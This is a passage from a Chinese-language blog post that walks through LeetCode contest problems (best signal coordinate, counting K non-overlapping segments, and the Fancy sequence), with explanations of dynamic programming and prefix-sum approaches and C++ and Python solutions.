class="keyword">for</span>(<span class="keyword">int</span> i = remove; i &lt; n-remove; ++i)&#123;</span><br><span class="line">            sum += arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> sum/(n-remove*<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5528-网络信号最好的坐标"><a href="#5528-网络信号最好的坐标" class="headerlink" title="5528. 网络信号最好的坐标"></a>5528. 网络信号最好的坐标</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>给你一个数组 <code>towers</code> 和一个整数 <code>radius</code> ，数组中包含一些网络信号塔，其中 <code>towers[i] = [xi, yi, qi]</code>表示第 i 个网络信号塔的坐标是<code>(xi, yi)</code>且信号强度参数为 qi 。所有坐标都是在  <code>X-Y</code>坐标系内的 整数 坐标。两个坐标之间的距离用 欧几里得距离 计算。</p><p>整数 <code>radius</code>表示一个塔 能到达 的 最远距离 。如果一个坐标跟塔的距离在 radius 以内，那么该塔的信号可以到达该坐标。在这个范围以外信号会很微弱，所以 radius 以外的距离该塔是 不能到达的 。</p><p>如果第 i 个塔能到达 <code>(x, y)</code>，那么该塔在此处的信号为 <code>⌊qi / (1 + d)⌋</code>，其中 d 是塔跟此坐标的距离。一个坐标的 网络信号 是所有 能到达 该坐标的塔的信号强度之和。</p><p>请你返回 网络信号 最大的整数坐标点。如果有多个坐标网络信号一样大，请你返回字典序最小的一个坐标。</p><p>注意：</p><p>坐标 <code>(x1, y1)</code> 字典序比另一个坐标 <code>(x2, y2)</code>小：要么<code>x1 &lt; x2</code>，要么 <code>x1 == x2</code>且 <code>y1 &lt; y2</code> 。<br><code>⌊val⌋</code>表示小于等于 <code>val</code> 的最大整数（向下取整函数）。</p><p>示例 1：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入：towers = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span>],[<span class="number">2</span>,<span class="number">1</span>,<span class="number">7</span>],[<span class="number">3</span>,<span class="number">1</span>,<span class="number">9</span>]], radius = <span class="number">2</span></span><br><span class="line">输出：[<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line">解释：</span><br><span class="line">坐标 (<span class="number">2</span>, <span class="number">1</span>) 信号强度之和为 <span class="number">13</span></span><br><span class="line">- 塔 (<span class="number">2</span>, <span class="number">1</span>) 强度参数为 <span class="number">7</span> ，在该点强度为 ⌊<span class="number">7</span> / (<span class="number">1</span> + sqrt(<span class="number">0</span>)⌋ = ⌊<span class="number">7</span>⌋ = <span class="number">7</span></span><br><span class="line">- 塔 (<span class="number">1</span>, <span class="number">2</span>) 强度参数为 <span class="number">5</span> ，在该点强度为 ⌊<span class="number">5</span> / (<span class="number">1</span> + sqrt(<span class="number">2</span>)⌋ = ⌊<span class="number">2.07</span>⌋ = <span class="number">2</span></span><br><span class="line">- 塔 (<span class="number">3</span>, <span class="number">1</span>) 强度参数为 <span class="number">9</span> ，在该点强度为 ⌊<span class="number">9</span> / (<span class="number">1</span> + sqrt(<span class="number">1</span>)⌋ = ⌊<span class="number">4.5</span>⌋ = <span class="number">4</span></span><br><span class="line">没有别的坐标有更大的信号强度。</span><br></pre></td></tr></table></figure><p>示例 2：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：towers = [[23,11,21]],<span class="built_in"> radius </span>= 9</span><br><span class="line">输出：[23,11]</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：towers = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">13</span>],[<span class="number">2</span>,<span class="number">1</span>,<span class="number">7</span>],[<span class="number">0</span>,<span class="number">1</span>,<span class="number">9</span>]], radius = <span class="number">2</span></span><br><span class="line">输出：[<span class="number">1</span>,<span class="number">2</span>]</span><br></pre></td></tr></table></figure><br>示例 4：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：towers = [[<span class="number">2</span>,<span class="number">1</span>,<span class="number">9</span>],[<span class="number">0</span>,<span class="number">1</span>,<span class="number">9</span>]], radius = <span class="number">2</span></span><br><span class="line">输出：[<span class="number">0</span>,<span class="number">1</span>]</span><br><span class="line">解释：坐标 (<span class="number">0</span>, <span class="number">1</span>) 和坐标 (<span class="number">2</span>, <span class="number">1</span>) 都是强度最大的位置，但是 (<span class="number">0</span>, <span class="number">1</span>) 字典序更小。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= towers.length &lt;= 50</code></li><li><code>towers[i].length == 3</code></li><li><code>0 &lt;= xi, yi, qi &lt;= 50</code></li><li><code>1 &lt;= radius &lt;= 50</code></li></ul><h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/coordinate-with-maximum-network-quality" target="_blank" rel="noopener">https://leetcode-cn.com/problems/coordinate-with-maximum-network-quality</a></p><h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 暴力统计即可</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>暴力统计区域内的所有点的信号强度，找到最大的强度的点即可。<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; bestCoordinate(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; towers, <span class="keyword">int</span> radius) &#123;</span><br><span class="line">        <span class="keyword">int</span> n = towers.size();</span><br><span class="line">        <span class="keyword">int</span> minX = INT_MAX;</span><br><span class="line">        <span class="keyword">int</span> minY = INT_MAX;</span><br><span class="line">        <span class="keyword">int</span> maxX = INT_MIN;</span><br><span class="line">        <span class="keyword">int</span> maxY = INT_MIN;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; ans(<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : towers)&#123;</span><br><span class="line">            minX = min(minX,v[<span class="number">0</span>]);</span><br><span class="line">            minY = min(minY,v[<span class="number">1</span>]);</span><br><span class="line">            maxX = max(maxX,v[<span class="number">0</span>]);</span><br><span class="line">            maxY = max(maxY,v[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> maxSum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> x = minX ; x &lt;= maxX; x++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> y = minY; y &lt;= maxY; y++)&#123;</span><br><span class="line">                <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">auto</span> v : towers)&#123;</span><br><span class="line">                    <span class="keyword">double</span> d = <span class="built_in">sqrt</span>(<span class="built_in">pow</span>(x-v[<span class="number">0</span>],<span class="number">2</span>) + <span class="built_in">pow</span>(y-v[<span class="number">1</span>],<span class="number">2</span>));</span><br><span class="line">                    <span class="keyword">if</span>(d &lt;= radius)&#123;</span><br><span class="line">                        sum += (<span class="keyword">int</span>)((<span class="keyword">double</span>)v[<span class="number">2</span>]/(<span class="number">1</span>+d));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(sum &gt; maxSum)&#123;</span><br><span class="line">                    ans[<span class="number">0</span>] = x;</span><br><span class="line">                    ans[<span class="number">1</span>] = y;</span><br><span class="line">                    maxSum = sum;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5527-大小为-K-的不重叠线段的数目"><a href="#5527-大小为-K-的不重叠线段的数目" class="headerlink" title="5527. 大小为 K 的不重叠线段的数目"></a>5527. 大小为 K 的不重叠线段的数目</h2><p>给你一维空间的 <code>n</code>个点，其中第 i 个点（编号从 0 到 n-1）位于 <code>x = i</code>处，请你找到 恰好 k 个不重叠 线段且每个线段至少覆盖两个点的方案数。线段的两个端点必须都是 整数坐标 。这 k 个线段不需要全部覆盖全部 n 个点，且它们的端点 可以 重合。</p><p>请你返回 <code>k</code> 个不重叠线段的方案数。由于答案可能很大，请将结果对 <code>109 + 7</code>取余 后返回。</p><p>示例 1：<br><img src="https://i.loli.net/2020/10/18/yRWtkFUHC5nqIPz.png" alt="1"><br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：n = <span class="number">4</span>, k = <span class="number">2</span></span><br><span class="line">输出：<span class="number">5</span></span><br><span class="line">解释：</span><br><span class="line">如图所示，两个线段分别用红色和蓝色标出。</span><br><span class="line">上图展示了 <span class="number">5</span> 种不同的方案 &#123;(<span class="number">0</span>,<span class="number">2</span>),(<span class="number">2</span>,<span class="number">3</span>)&#125;，&#123;(<span class="number">0</span>,<span class="number">1</span>),(<span class="number">1</span>,<span class="number">3</span>)&#125;，&#123;(<span class="number">0</span>,<span class="number">1</span>),(<span class="number">2</span>,<span class="number">3</span>)&#125;，&#123;(<span class="number">1</span>,<span class="number">2</span>),(<span class="number">2</span>,<span class="number">3</span>)&#125;，&#123;(<span class="number">0</span>,<span class="number">1</span>),(<span class="number">1</span>,<span class="number">2</span>)&#125; 。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：n = <span class="number">3</span>, k = <span class="number">1</span></span><br><span class="line">输出：<span class="number">3</span></span><br><span class="line">解释：总共有 <span class="number">3</span> 种不同的方案 &#123;(<span class="number">0</span>,<span class="number">1</span>)&#125;, &#123;(<span class="number">0</span>,<span class="number">2</span>)&#125;, &#123;(<span class="number">1</span>,<span class="number">2</span>)&#125; 。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：n = <span class="number">30</span>, k = <span class="number">7</span></span><br><span class="line">输出：<span class="number">796297179</span></span><br><span class="line">解释：画 <span class="number">7</span> 条线段的总方案数为 <span class="number">3796297200</span> 种。将这个数对 <span class="number">109</span> + <span class="number">7</span> 取余得到 <span class="number">796297179</span> 。</span><br></pre></td></tr></table></figure><br>示例 4：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：n = <span class="number">5</span>, k = <span class="number">3</span></span><br><span class="line">输出：<span class="number">7</span></span><br></pre></td></tr></table></figure><br>示例 5：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：n = <span class="number">3</span>, k = <span class="number">2</span></span><br><span class="line">输出：<span class="number">1</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>2 &lt;= n &lt;= 1000</code></li><li><code>1 &lt;= k &lt;= n-1</code></li></ul><h3 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/number-of-sets-of-k-non-overlapping-line-segments" target="_blank" rel="noopener">https://leetcode-cn.com/problems/number-of-sets-of-k-non-overlapping-line-segments</a></p><h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote><p> dp动态规划</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol><li>二维dp:最明显的我们设<code>dp[i][j]</code>标签最大的坐标为<code>i</code>时，选择<code>j</code>个不重叠的线段的方案数。则我们可以得到：如果<code>j</code>个线段中不选择坐标<code>i</code>时，则$dp[i][j] = dp[i-1][j]$;如果<code>j</code>个线段中选择坐标<code>i</code>时，则在前<code>0~i-1</code>中选择一个点与坐标<code>i</code>构成一个线段，则$dp[i][j] = \sum_{k=0}^{j-1}dp[k][j-1]$.此时我们即可以得到递推公式如下：<script type="math/tex; mode=display">dp[i][j] = dp[i-1][j] + \sum_{k=0}^{j-1}dp[k][j-1]</script>我们直接利用前缀和即可，每次计算当前的前缀和即可。</li><li>三维<code>dp</code>:我们还是设<code>dp[i][j]</code>表示由<code>[0..i]</code>集合的点中构成了<code>j</code>条线段的组合方案数。则进行三维<code>dp</code>状态切割，分为两种：</li></ol><ul><li>$dp[i][j][0]$表示第<code>j</code>条线段的右端点不包含坐标<code>i</code>的方案数。</li><li>$dp[i][j][1]$表示第<code>j</code>条线段的右端点包含坐标<code>i</code>的方案数。<br>则此时我们计算递推公式，计算状态转移时也分为两种情况：</li><li>$dp[i][j][0]$: 第<code>j</code>条线段右端点不为<code>i</code>，则很明显可以得到递推如下：<script type="math/tex; mode=display">dp[i][j][0] = dp[i-1][j][0] + dp[i-1][j][1]</script></li><li>$dp[i][j][1]$: 第<code>j</code>条线段右端点包含<code>i</code>,且第<code>j</code>条线段的长度为<code>1</code>，则此时：<script type="math/tex; mode=display">dp[i][j][1] = dp[i-1][j-1][0] + dp[i-1][j-1][1]</script></li><li>$dp[i][j][1]$: 第<code>j</code>条线段右端点包含<code>i</code>,且第<code>j</code>条线段的长度大于<code>1</code>，则此时即在前<code>i-1</code>的且最后的线段右端点为<code>i+1</code>的基础进行衔接即可，则此时：<script type="math/tex; mode=display">dp[i][j][1] = dp[i-1][j][1]</script>综上所述，我们可以得到总的递推公式如下：<script type="math/tex; mode=display">dp[i][j][0] =  dp[i-1][j][0] + dp[i-1][j][1] \\\qquad \\dp[i][j][1] =  dp[i-1][j-1][0] + dp[i-1][j-1][1] + dp[i-1][j][1] \\</script></li></ul><ol><li>数学方法：我们设<code>k</code>条线段的断电分别为$(l_{i},r_{i})$,则我们知道其约束的大小规则应满足如下：<script type="math/tex; mode=display">0 \le l_{1} < r_{1} \le l_{2} < r_{2} \le ... < l_{k} < r_{k} < n</script>因为相邻的节点直接存在重合，所以我们不能直接用排列组合，我们应该想办法去掉中间的小于等于，使其节点变为严格的递增，则此时我们即可用排列组合。<br>我们可以如此变换即可，令$l_{i}^{‘} = l_{i} + i - 1,r_{i}^{‘} = r_{i} + i - 1$,则此时我们可以将上述的不等式变为如下：<script type="math/tex; mode=display">0 < l_{1}^{'} < r_{1}^{'}  < l_{2}^{'}  < r_{2}^{'}  <  ... < l_{k}^{'}  < r_{k}^{'}  < n + k - 1</script>严格递增时，此时我们既可以用排列组合即可。<script type="math/tex; mode=display">F(n,k) = C_{n+k-1}^{2k}</script></li></ol></blockquote><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><ul><li><p>二维dp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> dp[<span class="number">1001</span>][<span class="number">1001</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numberOfSets</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="keyword">sizeof</span>(dp));</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>&gt; sum(n,<span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        sum[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            dp[i][<span class="number">1</span>] = i*(i+<span class="number">1</span>)/<span class="number">2</span>;</span><br><span class="line">            sum[i] = (sum[i<span class="number">-1</span>] + dp[i][<span class="number">1</span>])%mod;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= k; ++i)&#123;</span><br><span class="line">            <span class="built_in">vector</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>&gt; currSum(n,<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">2</span>; j &lt; n; ++j)&#123;</span><br><span class="line">                dp[j][i] = (dp[j<span class="number">-1</span>][i] + sum[j<span class="number">-1</span>] + mod)%mod;</span><br><span class="line">                currSum[j] = (currSum[j<span class="number">-1</span>] + dp[j][i])%mod;</span><br><span class="line">            &#125;</span><br><span class="line">            sum = currSum;</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">return</span> dp[n<span class="number">-1</span>][k];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>三维dp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">constexpr</span> <span class="keyword">int</span> mod = <span class="number">1000000007</span>;</span><br><span class="line">    <span class="keyword">int</span> f[<span class="number">1000</span>][<span class="number">1001</span>][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numberOfSets</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">memset</span>(f, <span class="number">0</span>, <span class="keyword">sizeof</span>(f));</span><br><span class="line">        f[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= k; ++j) &#123;</span><br><span class="line">                f[i][j][<span class="number">0</span>] = (f[i - <span class="number">1</span>][j][<span class="number">0</span>] + f[i - <span class="number">1</span>][j][<span class="number">1</span>]) % mod;</span><br><span class="line">                f[i][j][<span class="number">1</span>] = f[i - <span class="number">1</span>][j][<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> (j &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    f[i][j][<span class="number">1</span>] += f[i - <span class="number">1</span>][j - <span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">                    f[i][j][<span class="number">1</span>] %= mod;</span><br><span class="line">                    f[i][j][<span class="number">1</span>] += f[i - <span class="number">1</span>][j - <span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">                    f[i][j][<span class="number">1</span>] %= mod;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (f[n - <span class="number">1</span>][k][<span class="number">0</span>] + f[n - <span class="number">1</span>][k][<span class="number">1</span>]) % mod;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><h2 id="5530-奇妙序列"><a href="#5530-奇妙序列" class="headerlink" title="5530. 奇妙序列"></a>5530. 奇妙序列</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>请你实现三个 <code>API append</code>，<code>addAll</code> 和 <code>multAll</code>来实现奇妙序列。</p><p>请实现 <code>Fancy</code> 类 ：</p><ul><li><code>Fancy()</code>初始化一个空序列对象。</li><li><code>void append(val)</code> 将整数 val 添加在序列末尾。</li><li><code>void addAll(inc)</code> 将所有序列中的现有数值都增加 inc 。</li><li><code>void multAll(m)</code> 将序列中的所有现有数值都乘以整数 m 。</li><li><code>int getIndex(idx)</code> 得到下标为 idx 处的数值（下标从 0 开始），并将结果对 109 + 7 取余。如果下标大于等于序列的长度，请返回 -1 。</li></ul><p>示例：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">输入：</span><br><span class="line">[<span class="string">"Fancy"</span>, <span class="string">"append"</span>, <span class="string">"addAll"</span>, <span class="string">"append"</span>, <span class="string">"multAll"</span>, <span class="string">"getIndex"</span>, <span class="string">"addAll"</span>, <span class="string">"append"</span>, <span class="string">"multAll"</span>, <span class="string">"getIndex"</span>, <span class="string">"getIndex"</span>, <span class="string">"getIndex"</span>]</span><br><span class="line">[[], [<span class="number">2</span>], [<span class="number">3</span>], [<span class="number">7</span>], [<span class="number">2</span>], [<span class="number">0</span>], [<span class="number">3</span>], [<span class="number">10</span>], [<span class="number">2</span>], [<span class="number">0</span>], [<span class="number">1</span>], [<span class="number">2</span>]]</span><br><span class="line">输出：</span><br><span class="line">[null, null, null, null, null, <span class="number">10</span>, null, null, null, <span class="number">26</span>, <span class="number">34</span>, <span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">解释：</span><br><span class="line">Fancy fancy = new Fancy();</span><br><span class="line">fancy.append(<span class="number">2</span>);   <span class="comment">// 奇妙序列：[2]</span></span><br><span class="line">fancy.addAll(<span class="number">3</span>);   <span class="comment">// 奇妙序列：[2+3] -&gt; [5]</span></span><br><span class="line">fancy.append(<span class="number">7</span>);   <span class="comment">// 奇妙序列：[5, 7]</span></span><br><span class="line">fancy.multAll(<span class="number">2</span>);  <span class="comment">// 奇妙序列：[5*2, 7*2] -&gt; [10, 14]</span></span><br><span class="line">fancy.getIndex(<span class="number">0</span>); <span class="comment">// 返回 10</span></span><br><span class="line">fancy.addAll(<span class="number">3</span>);   <span class="comment">// 奇妙序列：[10+3, 14+3] -&gt; [13, 17]</span></span><br><span class="line">fancy.append(<span class="number">10</span>);  <span class="comment">// 奇妙序列：[13, 17, 10]</span></span><br><span class="line">fancy.multAll(<span class="number">2</span>);  <span class="comment">// 奇妙序列：[13*2, 17*2, 10*2] -&gt; [26, 34, 20]</span></span><br><span class="line">fancy.getIndex(<span class="number">0</span>); <span class="comment">// 返回 26</span></span><br><span class="line">fancy.getIndex(<span class="number">1</span>); <span class="comment">// 返回 34</span></span><br><span class="line">fancy.getIndex(<span class="number">2</span>); <span class="comment">// 返回 20</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= val, inc, m &lt;= 100</code></li><li><code>0 &lt;= idx &lt;= 105</code></li><li>总共最多会有 <code>105</code> 次对 append，addAll，multAll 和 getIndex 的调用。</li></ul><h3 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/contest/biweekly-contest-37/problems/fancy-sequence/" target="_blank" rel="noopener">https://leetcode-cn.com/contest/biweekly-contest-37/problems/fancy-sequence/</a></p><h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><blockquote><p>数学问题</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>乘法逆元，前缀和：数学问题相对较为复杂。具体来说我们可以设数列中每个元素的实际存放的值为$element[i] = a[i]*val[i]+b[i]$,我们每次保存$val[i]$,每次在查询的时候我们只需要求出第<code>i</code>个元素对应的系数即可。</li></ol><ul><li>我们知道第一次进行<code>append</code>第<code>i</code>个元素时，此时$element[i] = 1*val[i] + 0$，</li><li>当我们对第<code>i</code>个元素进行相加操作时，比如加上<code>x</code>,则此时$element[i] = a[i]*val[i]+b[i] + x$.</li><li>当我们对第<code>i</code>个元素进行相乘操作时，比如乘上<code>y</code>,则此时$element[i] = y<em>a[i]</em>val[i] + y*b[i]$.</li><li>有了上述两个结论后，我们可以保存前<code>i</code>项的乘法系数的前缀乘积，和前<code>i</code>项的加法系数的前缀和。</li><li>比如我们已知经过<code>k</code>次的乘法加法操作后，我们每次保存当前系数的前缀乘积为$multsum[k] = \prod_{i=1}^{k}a[i]$,加法系数的前缀和为$addsum[k] = \sum_{i=1}^{k}a[i]$,此时如果我们需要求第<code>i</code>个元素时，我们只需要将其乘法系数即可和加法系数求出即可。</li></ul></blockquote><ol><li>线段树：数学问题太过于复杂，我们可以用简单的线段树解决该问题，利用线段树的lazy节点即可,<br><a href="https://www.luogu.com.cn/problem/P3373" target="_blank" rel="noopener">POJ模板</a>，线段树标准的模板，果真线段树是万能的解题工具，强大的刷题利器。线段树解法需要非常注意<code>lazy</code>节点的<code>pushdown</code>和<code>pushup</code>函数功能。题目还是非常经典的，对于理解强大的线段树，需要经常做类似的题目。<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3></li></ol><ul><li>前缀和<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fancy</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.A = []</span><br><span class="line">        self.add = [<span class="number">0</span>]</span><br><span class="line">        self.mul = [<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">append</span><span class="params">(self, a)</span>:</span></span><br><span class="line">        self.A.append(a)</span><br><span class="line">        self.add.append(self.add[<span class="number">-1</span>])</span><br><span class="line">        self.mul.append(self.mul[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addAll</span><span class="params">(self, inc)</span>:</span></span><br><span class="line">        self.add[<span class="number">-1</span>] += inc</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> 